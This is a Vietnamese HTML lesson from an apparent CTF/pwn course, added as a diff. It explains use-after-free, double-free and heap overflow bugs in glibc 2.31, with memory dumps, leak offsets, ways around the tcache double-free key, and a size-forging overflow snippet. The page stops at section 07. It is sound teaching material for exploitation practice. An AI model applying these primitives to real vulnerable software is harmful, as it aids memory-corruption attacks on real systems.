@@ -1,0 +1,570 @@
+<title>Heap Bugs</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:90px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+.sbx{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0}
+.sbx .btns{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
+.sbx button{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--fg);padding:7px 12px;border-radius:8px;cursor:pointer}
+.sbx button:hover{border-color:var(--accent);color:var(--accent)}
+.sbx button.reset{color:var(--muted)}
+.sbx .bin{font-family:var(--font-mono);font-size:12.5px;display:flex;flex-direction:column;gap:5px;min-height:40px}
+.sbx .node{border:1px solid var(--line);border-radius:7px;padding:7px 11px;background:var(--surface);display:flex;justify-content:space-between;gap:10px}
+.sbx .node.dup{border-color:var(--danger);background:var(--danger-soft)}
+.sbx .log{margin-top:12px;font-family:var(--font-mono);font-size:12px;color:var(--muted);border-top:1px dashed var(--line);padding-top:8px;white-space:pre-wrap;line-height:1.5}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 4 · Bài 19</div>
+    <h1>Heap Bugs</h1>
+    <p class="sub">Ba nguồn lỗi heap căn bản — <strong>UAF</strong> (dùng con trỏ đã free), <strong>Double-Free</strong> (free hai lần), <strong>Heap Overflow</strong> (ghi tràn đè header chunk kế) — đi kèm <strong>số thật glibc 2.31</strong>: ta thấy chính xác byte nào đổi, fd/key ra giá trị gì, và bug biến thành ghi tùy ý thế nào. Đây là "cửa vào"; biến chúng thành RCE là việc của bài kỹ thuật sau.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 4)</span>
+      <span class="chip"><b>glibc mẫu:</b> 2.31</span>
+      <span class="chip"><b>Cần trước:</b> <a href="heap_internals.html" style="color:inherit">heap_internals</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~60 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 UAF</a><a href="#s4">04 Double-free</a><a href="#s5">05 Overflow</a><a href="#s6">06 Sandbox</a><a href="#s7">07 Tự tìm</a>
+      <a href="#s8">08 Exploit thật</a><a href="#s9">09 Công cụ</a><a href="#s10">10 Gỡ lỗi</a>
+      <a href="#s11">11 Biến thể</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>UAF:</strong> chương trình <code>free(p)</code> nhưng <em>không xóa con trỏ</em> p, rồi vẫn <code>edit(p)</code>/<code>show(p)</code>. Chunk free chứa <code>fd/bk</code> → đọc = leak, ghi = sửa metadata bin.</p>
+    <p><strong>Double-free:</strong> <code>free(p)</code> hai lần → cùng chunk vào bin hai lần → <code>malloc</code> có thể trả <em>cùng địa chỉ hai lần</em> (overlap) → nền cho poisoning.</p>
+    <p><strong>Heap overflow:</strong> ghi quá cỡ chunk A → tràn sang <mark>header chunk B</mark> (<code>size</code>/<code>fd</code>) ngay sau → điều khiển allocator qua chunk B.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>ba bug này chỉ là CÁCH chạm vào metadata chunk free. Chạm được rồi → sang bài poisoning/attack để biến thành ghi tùy ý.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — nhận bug & bước kế</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Nhận dạng từ menu/source</span>
+        <p><b>UAF</b>: hàm free thiếu <code>ptr[idx]=NULL</code>, vẫn còn show/edit theo idx cũ · <b>Double-free</b>: free cùng idx 2 lần không chặn · <b>Overflow</b>: <code>read(fd,buf,SIZE_CỐ_ĐỊNH)</code> trong khi chunk nhỏ hơn (size nhập ≠ size ghi).</p></div>
+      <div class="combat-row"><span class="lab">💧 UAF → leak</span>
+        <p>Free chunk lớn (&gt;0x410 → unsorted) → <code>show</code> đọc <code>fd</code> = libc (2.31: <code>leak − 0x1ecbe0</code>). Free 2 chunk nhỏ cùng size → show fd chunk đỉnh = con trỏ heap (leak heap, cần cho <a href="tcache_fastbin.html">safe-linking</a> ≥2.32).</p></div>
+      <div class="combat-row"><span class="lab">🎯 UAF/DF → ghi tùy ý</span>
+        <p>Chunk còn trong tcache + ghi được <code>fd</code> → trỏ fd tới đích (<code>__free_hook</code>, stdout, struct) → malloc 2 lần → lần 2 trả về đích → ghi. Xem <a href="tcache_fastbin.html">poisoning</a>.</p></div>
+      <div class="combat-row"><span class="lab">🧱 Overflow → đè chunk kế</span>
+<pre><code>[chunk A data ...........]  ← ghi tràn
+[B.prev_size][B.size|P]     ← đè size/fd của B
+<span class="c"># phóng to size B → nuốt chunk C = overlap</span></code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy glibc</span>
+        <p>tcache (≥2.29) có <b>key</b> chống double-free đơn giản → xen 1 free khác giữa 2 lần free, hoặc dùng fastbin double-free. fd bị <b>safe-linking</b> (≥2.32): cần leak heap. <code>__free_hook</code> mất từ <b>2.34</b> → FSOP.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Con trỏ "treo" (dangling)</h2>
+  <p>Khi <code>free(p)</code>, vùng nhớ được trả lại allocator nhưng <strong>giá trị con trỏ p không đổi</strong> — nó vẫn trỏ vào vùng đó. Nếu chương trình không gán <code>p = NULL</code>, p trở thành <span class="mem-term">dangling pointer</span> (con trỏ treo). Mọi bug trong bài đều xoay quanh việc chương trình còn tin tưởng một con trỏ/ô dữ liệu mà allocator đã "coi là trống" và đã ghi metadata bin đè lên.</p>
+
+  <h4 style="margin-top:10px">Định nghĩa nhanh (gặp lần đầu)</h4>
+  <div class="grid">
+    <div class="card"><div class="term">dangling pointer</div><p>Con trỏ còn trỏ vào chunk đã free. Gốc của UAF.</p></div>
+    <div class="card"><div class="term">UAF</div><p>Use-After-Free: đọc/ghi qua dangling pointer.</p></div>
+    <div class="card"><div class="term">double-free</div><p>Free cùng chunk 2 lần → bin "vòng".</p></div>
+    <div class="card"><div class="term">overlap</div><p>Hai "chunk" cùng chiếm một vùng nhớ → ghi cái này sửa cái kia.</p></div>
+    <div class="card"><div class="term">tcache key</div><p>Trường ở <code>chunk+0x18</code>, = con trỏ tcache_perthread, dùng dò double-free.</p></div>
+    <div class="card"><div class="term">consolidate</div><p>Gộp chunk free kề nhau khi free (với chunk không-tcache/không-fast).</p></div>
+  </div>
+
+  <div class="note"><span class="tag">Liên hệ bài trước</span>Bài này giả định bạn đã nắm <a href="heap_internals.html">heap_internals</a>: chunk có header 0x10, chunk free lưu <code>fd/bk</code> trong vùng data, bin tái dùng theo size, leak libc từ unsorted = <code>leak − 0x1ecbe0</code> (2.31).</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Bug là cửa, kỹ thuật là phòng</h2>
+  <p>Allocator <strong>tin tuyệt đối</strong> vào metadata chunk (size, fd, bk, key). Ba bug này đều cho attacker <em>chạm vào</em> metadata đó trong khi allocator vẫn tin:</p>
+  <ul>
+    <li><strong>UAF</strong>: còn đọc/ghi được chunk sau khi nó vào bin → đọc <code>fd</code> (leak) hoặc ghi <code>fd</code> (lái malloc).</li>
+    <li><strong>Double-free</strong>: đẩy cùng chunk vào bin hai lần → tạo vòng/overlap → malloc trả trùng.</li>
+    <li><strong>Overflow</strong>: ghi tràn làm hỏng header chunk <em>kế bên</em> → forge size/fd mà không cần free nó.</li>
+  </ul>
+  <p>Một mình, các bug chỉ gây rối. Kết hợp với kỹ thuật (<a href="tcache_fastbin.html">poisoning</a>, <a href="unsorted_largebin.html">largebin</a>, <a href="fsop.html">FSOP</a>) chúng thành <strong>ghi tùy ý → RCE</strong>. Bài này dạy nhận &amp; kích hoạt bug; bài sau dạy "nạp đạn".</p>
+ </div>
+</section>
+
+<!-- 03 UAF -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / USE-AFTER-FREE · MỤC LÕI</div>
+  <h2>UAF: leak và ghi, có số thật</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 640 170" role="img" aria-label="free(p) để p treo; show(p) đọc fd = leak; edit(p) ghi fd = lái malloc" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="11.5">
+    <rect x="30" y="30" width="160" height="40" rx="7" stroke-width="1.4"/><text x="110" y="47" text-anchor="middle" fill="currentColor" stroke="none">p = malloc()</text><text x="110" y="62" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.6">data của bạn</text>
+    <rect x="240" y="30" width="160" height="40" rx="7" stroke-width="1.4" stroke="var(--mem)"/><text x="320" y="47" text-anchor="middle" fill="var(--mem)" stroke="none">free(p)  // p KHÔNG NULL</text><text x="320" y="62" text-anchor="middle" fill="var(--mem)" stroke="none" opacity="0.8">data → fd/bk (bin)</text>
+    <rect x="450" y="14" width="170" height="34" rx="7" stroke-width="1.6" stroke="#e8663e"/><text x="535" y="35" text-anchor="middle" fill="#e8663e" stroke="none">show(p) → đọc fd = LEAK</text>
+    <rect x="450" y="56" width="170" height="34" rx="7" stroke-width="1.6" stroke="#e8663e"/><text x="535" y="77" text-anchor="middle" fill="#e8663e" stroke="none">edit(p) → GHI fd = lái malloc</text>
+    <line x1="190" y1="50" x2="238" y2="50" stroke-width="1.4" marker-end="url(#a3)"/>
+    <line x1="400" y1="45" x2="448" y2="33" stroke="#e8663e" stroke-width="1.5" marker-end="url(#a3)"/>
+    <line x1="400" y1="55" x2="448" y2="70" stroke="#e8663e" stroke-width="1.5" marker-end="url(#a3)"/>
+    </g>
+    <defs><marker id="a3" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker></defs>
+    <text x="320" y="118" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.7">Vì p còn trỏ vào chunk đã free, show/edit đọc-ghi thẳng vào fd/bk của bin.</text>
+    <text x="320" y="138" font-size="11" text-anchor="middle" fill="#e8663e" stroke="none">Cam = thao tác attacker lợi dụng dangling pointer.</text>
+  </svg>
+  <figcaption>UAF = dùng con trỏ sau free. Đọc fd → leak; ghi fd → điều khiển malloc kế tiếp.</figcaption>
+  </figure>
+
+  <h3>UAF-read: ví dụ số thật (glibc 2.31)</h3>
+  <pre><code><span class="c"># tcache (chunk 0x90): free 2 chunk x,y cùng size → tcache: y → x</span>
+<span class="c"># x/2gx &amp;y_data  sau khi free cả hai (heap base 0x405000):</span>
+0x405290:  0x0000000000405250  0x0000558e9a3b1010   <span class="c"># fd = &amp;x (HEAP leak!), key</span>
+<span class="c">#          └ fd = địa chỉ chunk x → leak heap base ┘</span>
+
+<span class="c"># unsorted (chunk 0x500): free 1 chunk → fd=bk=main_arena+0x60</span>
+0x4052b0:  0x00007ffff7facbe0  0x00007ffff7facbe0   <span class="c"># fd=bk=libc+0x1ecbe0 (LIBC leak!)</span></code></pre>
+  <div class="note tip"><span class="tag">Hai loại leak</span><b>tcache/fastbin fd</b> → leak <em>heap</em> (giá trị trong vùng heap). <b>unsorted fd/bk</b> → leak <em>libc</em> (trỏ main_arena). Đề heap thường cần cả hai: libc để biết system/hook, heap để tính safe-linking (≥2.32).</div>
+
+  <h3>Hai công dụng chính (bảng)</h3>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Thao tác UAF</th><th>Lợi dụng</th><th>Kết quả</th></tr></thead>
+    <tbody>
+      <tr><td><code>show(p)</code> sau free</td><td>Đọc <code>fd</code>/<code>bk</code></td><td>Leak libc (unsorted) hoặc heap (tcache/fast)</td></tr>
+      <tr><td><code>edit(p)</code> sau free</td><td>Ghi <code>fd</code></td><td>Lái malloc kế về địa chỉ tùy ý (poisoning)</td></tr>
+      <tr><td>alloc lại, <code>edit</code> bản gốc</td><td>Hai con trỏ cùng chunk</td><td>Type confusion / overlap</td></tr>
+    </tbody>
+  </table></div>
+ </div>
+</section>
+
+<!-- 04 Double-free -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / DOUBLE-FREE</div>
+  <h2>Free hai lần → bin vòng, và cái "key" chặn nó</h2>
+  <p>Free cùng một chunk hai lần khiến nó <strong>xuất hiện hai lần</strong> trong bin. Hệ quả: hai lần malloc khác nhau trả về <em>cùng địa chỉ</em>. Khi bạn giữ hai "ô" cùng chunk, ghi vào ô-đang-trong-bin sửa được <code>fd</code> → malloc thứ ba đi tới đâu bạn chọn.</p>
+
+  <h3>tcache key — hàng rào glibc ≥2.29 (byte thật)</h3>
+  <p>Mỗi chunk khi vào tcache có trường <span class="mem-term">key</span> tại <code>chunk+0x18</code> = con trỏ <code>tcache_perthread_struct</code>. Khi free, glibc kiểm: nếu <code>key</code> đã bằng giá trị đó → nghi double-free → <code>abort("free(): double free detected in tcache 2")</code>.</p>
+  <div class="frame">
+    <div class="fr"><span class="o">+0x00</span><span>prev_size</span></div>
+    <div class="fr"><span class="o">+0x08</span><span>size | P (vd <code>0x91</code> cho chunk 0x90)</span></div>
+    <div class="fr key"><span class="o">+0x10</span><span><b>fd</b> → chunk tcache kế (hoặc NULL)</span></div>
+    <div class="fr"><span class="o">+0x18</span><span><b>key</b> = &amp;tcache_perthread (vd <code>0x405010</code>) — glibc so trường này để bắt double-free</span></div>
+  </div>
+  <pre><code><span class="c"># x/4gx &amp;x  sau free(x):  (heap 0x405000)</span>
+0x405250:  0x0...  0x0000000000000091
+0x405260:  0x0000000000000000  0x0000000000405010   <span class="c"># fd=NULL, key=&amp;tcache_perthread</span>
+<span class="c"># nếu UAF-edit được: ghi 0 vào key (chunk+0x18) → free lại KHÔNG bị bắt</span></code></pre>
+
+  <h3>Hai cách vượt key</h3>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Xen một free khác (không cần UAF-edit)</h4><p><code>free(A); free(B); free(A)</code> — lần free A thứ 2, đỉnh tcache là B (≠A), nên check "A có phải đỉnh?" không trùng... <em>nhưng</em> key check vẫn so A.key. Thực tế với tcache, cách chắc là ② hoặc dùng fastbin.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Xóa key bằng UAF-edit</h4><p>Có UAF-edit: ghi <code>p64(0)</code> vào <code>chunk+0x18</code> (hoặc toàn 16 byte <code>fd||key</code>) → key=0 → free lại qua được.</p></div></div>
+
+  <h3>Fastbin double-free (kinh điển, không có key)</h3>
+  <pre><code><span class="c"># fastbin chỉ chặn "chunk vừa free == đỉnh bin". Xen B là qua. (chunk ≤0x80)</span>
+<span class="c"># Cần tcache size đó ĐẦY trước (7 chunk) để free rơi xuống fastbin.</span>
+free(A)   <span class="c"># fastbin: A</span>
+free(B)   <span class="c"># fastbin: B → A</span>
+free(A)   <span class="c"># hợp lệ (đỉnh B != A). fastbin: A → B → A (VÒNG)</span>
+<span class="c"># malloc A; edit A.fd = target(size hợp lệ); malloc B; malloc A; malloc → target</span></code></pre>
+  <div class="note warn"><span class="tag">Fastbin kiểm size</span>Khác tcache, fastbin kiểm <code>chunksize(target) khớp index bin</code> khi lấy ra. Nên <code>target</code> phải có một "fake size" hợp lệ ở <code>target−0x8</code>. tcache KHÔNG kiểm → poisoning tcache dễ hơn nhiều.</div>
+ </div>
+</section>
+
+<!-- 05 Overflow -->
+<section class="block" id="s5">
+ <div class="wrap">
+  <div class="secnum">05 / HEAP OVERFLOW</div>
+  <h2>Tràn sang header chunk kế</h2>
+  <p>Nếu <code>edit</code> cho ghi dài hơn kích thước chunk, byte thừa tràn sang <strong>chunk ngay sau</strong> trong bộ nhớ (chunk cạnh nhau liền kề). Byte đầu tiên bạn chạm là <code>prev_size</code> rồi <code>size</code> của chunk kế.</p>
+  <div class="frame">
+    <div class="fr"><span class="o">A +0x00</span><span>A.header (chunk A tại 0x405250, data 0x405260)</span></div>
+    <div class="fr key"><span class="o">A +0x10</span><span>A.data ← ghi tràn từ đây …………………→</span></div>
+    <div class="fr"><span class="o">B +0x00</span><span>B.prev_size (bị đè) — B tại 0x405290</span></div>
+    <div class="fr key"><span class="o">B +0x08</span><span><b>B.size (bị đè)</b> → forge size để overlap / qua kiểm tra</span></div>
+    <div class="fr"><span class="o">B +0x10</span><span>B.fd (nếu B đã free → bị đè)</span></div>
+  </div>
+  <h3>Ví dụ số: phóng to size để overlap</h3>
+  <pre><code><span class="c"># A = malloc(0x18)@0x405250 (size 0x21), B = malloc(0x18)@0x405290, C = malloc(0x18)@0x4052b0</span>
+<span class="c"># overflow A ghi 0x18 byte rác + prev_size(8) + size mới của B:</span>
+edit(A, b"A"*0x18 + p64(0) + p64(0x61))   <span class="c"># B.size 0x21 → 0x61 (nuốt B+C)</span>
+free(B)   <span class="c"># glibc nghĩ B dài 0x60 → chunk free phủ cả C → OVERLAP</span>
+<span class="c"># giờ malloc(0x58) trả về vùng chứa C → đọc/ghi metadata C</span></code></pre>
+  <h3>Dùng để làm gì</h3>
+  <ul>
+    <li><strong>Phóng to size của B</strong> → khi free B, allocator nghĩ B lớn hơn → chunk free "nuốt" cả chunk C phía sau → <mark>overlap</mark>.</li>
+    <li><strong>Đè fd của B đã free</strong> (nếu B trong bin) → poisoning như UAF-edit.</li>
+    <li><strong>Off-by-one / poison null byte</strong>: chỉ tràn 1 byte (thường null) vào <code>size</code> của B → kỹ thuật shrink/extend tinh vi (house of einherjar…).</li>
+  </ul>
+  <div class="note tip"><span class="tag">Nhớ bit P</span>Khi forge <code>B.size</code>, giữ <code>PREV_INUSE</code> (bit0=1) trừ khi cố tình dùng backward-consolidate. Ví dụ muốn B = 0x60 thì ghi <code>0x61</code>.</div>
+ </div>
+</section>
+
+<!-- 06 Sandbox -->
+<section class="block" id="s6">
+ <div class="wrap wide">
+  <div class="secnum">06 / TỰ TAY THỬ</div>
+  <h2>Sandbox: tcache double-free</h2>
+  <p>Mô phỏng tcache LIFO. Thử: <code>free(A)</code> → <code>free(B)</code> → <code>free(A) lần 2</code> (A vào bin 2 lần) → <code>malloc</code> ×3: lấy A, B, rồi A lần nữa (trùng!). Giữa 2 lần free A cần free B xen vào để qua kiểm tra "đỉnh" đơn giản.</p>
+  <div class="lab">
+    <div class="sbx" id="sbx">
+      <div class="btns">
+        <button data-op="free">free(A)</button>
+        <button data-op="freeB">free(B)</button>
+        <button data-op="freeA2">free(A) lần 2 ⚠️</button>
+        <button data-op="malloc">malloc()</button>
+        <button data-op="reset" class="reset">↺ reset</button>
+      </div>
+      <div class="bin" id="bin"></div>
+      <div class="log" id="slog"></div>
+    </div>
+    <p class="lab-sub">tcache key (≥2.29) sẽ bắt free(A) lần 2 khi A còn ở đỉnh. Né bằng xen free(B), hoặc xóa key, hoặc dùng fastbin double-free.</p>
+  </div>
+ </div>
+</section>
+
+<!-- 07 Tự tìm -->
+<section class="block" id="s7">
+ <div class="wrap">
+  <div class="secnum">07 / TỰ TÌM THÔNG TIN</div>
+  <h2>Soi bug trong GDB</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Theo dõi bin sau mỗi free</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> bins       <span class="c"># chunk vào bin nào; vòng/trùng?</span>
+<span class="p">pwndbg&gt;</span> tcache     <span class="c"># đếm count; double-free → đếm sai / vòng</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Kiểm overlap</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> vis_heap_chunks   <span class="c"># hai con trỏ cùng vùng = overlap</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Xác nhận UAF-read &amp; key</h4>
+    <pre><code><span class="c"># sau free, show(p): in ra fd (libc/heap) → UAF read OK</span>
+<span class="p">pwndbg&gt;</span> x/4gx &amp;p_data    <span class="c"># xem fd + key (chunk+0x18)</span></code></pre></div></div>
